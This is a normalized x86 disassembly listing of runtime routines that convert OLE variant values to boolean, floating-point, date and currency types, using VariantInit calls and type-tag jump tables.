call [ esi + 0x1c ]
cmp [ esp + 0xc ] 0x1
sbb eax eax
inc eax
mov [ edi ] al
sub_410bf0
push ebx
push ecx
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_410c0a ]
mov eax ebx
call sub_410a38
mov [ esp ] al
jmp r-xdata
dec dx
je r-xdata
mov [ esp ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fild [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax ebx
call sub_410a38
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x1
sbb eax eax
inc eax
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_410bf0
mov [ esp ] al
jmp r-xdata
mov eax ebx
call sub_410b00
mov [ esp ] al
jmp r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov eax ebx
call sub_410b40
mov [ esp ] al
jmp r-xdata
jmp r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov dx 0xb
mov ax 0x1
call sub_40e940
setne al
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_410ba4
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_410b00
mov [ esp ] al
mov eax ebx
call sub_410b00
mov [ esp ] al
jmp r-xdata
jmp [ eax * 4 + jump_table_410dcc ]
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax ebx
call sub_410a38
mov [ esp ] al
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x1
sbb eax eax
inc eax
mov [ esp ] al
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_410bf0
mov [ esp ] al
jmp r-xdata
setne al
mov [ esp ] al
jmp r-xdata
cmp [ eax ] 0x0
sub_410f44
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_410ff9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412bb8
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_4043ec
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x18 ]
call sub_409824
test al al
je r-xdata
sub edx 0x7ffdfffb
jne r-xdata
mov dx [ ebx ]
mov cx 0x5
mov eax 0x80020005
call sub_40edd4
jmp r-xdata
fld [ ebp - 0x18 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov dx [ ebx ]
mov cx 0x5
call sub_40edd4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411000
lea eax [ ebp - 0x1c ]
call sub_404164
lea eax [ ebp - 0xc ]
call sub_404844
retn
sub_411008
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x5
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x5
call sub_40edd4
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
pop ebx
retn
sub_411054
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4110a9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f4a0
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_411104
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4110b0
lea eax [ ebp - 0x18 ]
call sub_40f178
retn
sub_4110b8
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_41468c
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x5
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_411104
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_411120 ]
mov eax ebx
call sub_410f44
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
fild [ ebx + 0x8 ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_410f44
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411104
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411008
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_411054
fstp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x5
mov ax 0x1
call sub_40e940
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_4110b8
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_411008
fstp [ esp ]
fwait
mov eax ebx
call sub_411008
fstp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_4112fd ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_410f44
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411104
fstp [ esp ]
fwait
jmp r-xdata
sub_41149c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x14
ja r-xdata
xor eax eax
push ebp
push sub_411601
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_411104
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_4114be ]
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
fild [ ebp - 0x14 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov dx 0x4
mov ax 0x1
call sub_40e940
sub_41162c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_411708
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412bb8
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_4043ec
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x8 ]
call sub_40b240
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41170f
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_404188
lea eax [ ebp - 0xc ]
call sub_404844
retn
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
call sub_4043ec
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x18 ]
call sub_409840
test al al
je r-xdata
mov dx [ ebx ]
mov cx 0x7
call sub_40edd4
jmp r-xdata
mov dx [ ebx ]
mov cx 0x7
mov eax 0x80020005
call sub_40edd4
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub_411718
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
mov [ ebp - 0x18 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x7
push 0x0
push 0x400
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x7
call sub_40edd4
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_411778
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x7
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x7
call sub_40edd4
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
pop ebx
retn
sub_4117c4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_411819
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f4a0
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_411874
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411820
lea eax [ ebp - 0x18 ]
call sub_40f178
retn
sub_411828
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_41468c
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x7
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_411874
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_411890 ]
mov eax ebx
call sub_41162c
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411778
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_41162c
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411718
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411874
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411778
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_4117c4
fstp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x7
mov ax 0x1
call sub_40e940
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_411828
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_411778
fstp [ esp ]
fwait
mov eax ebx
call sub_411778
fstp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_411a5b ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411778
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_41162c
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411718
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411874
fstp [ esp ]
fwait
jmp r-xdata
sub_411bc4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_411c70
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412bb8
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_4043ec
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
call sub_409898
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411c77
lea eax [ ebp - 0x10 ]
call sub_404164
lea eax [ ebp - 0xc ]
call sub_404844
retn
mov dx [ ebx ]
mov cx 0x6
mov eax 0x80020005
call sub_40edd4
jmp r-xdata
mov dx [ ebx ]
mov cx 0x6
call sub_40edd4
jmp r-xdata
sub_411c80
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
mov [ ebp - 0x18 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x6
push 0x0
push 0x400
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x6
call sub_40edd4
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_411ce0
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x6
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x6
call sub_40edd4
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fild [ esp ]
add esp 0x18
pop ebx
retn
sub_411d2c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_411d81
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f4a0
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_411ddc
fistp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411d88
lea eax [ ebp - 0x18 ]
call sub_40f178
retn
sub_411d90
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_41468c
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x6
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_411ddc
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_411df8 ]
mov eax ebx
call sub_411bc4
fistp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411ce0
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_411ce0
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411bc4
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411c80
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411ddc
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411ce0
fistp [ esp ]
fwait
jmp r-xdata
fild [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_411d2c
fistp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x6
mov ax 0x1
call sub_40e940
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_411d90
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_411ce0
fistp [ esp ]
fwait
mov eax ebx
call sub_411ce0
fistp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_411ffd ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411ce0
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_411ce0
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411bc4
fistp [ esp ]
fwait
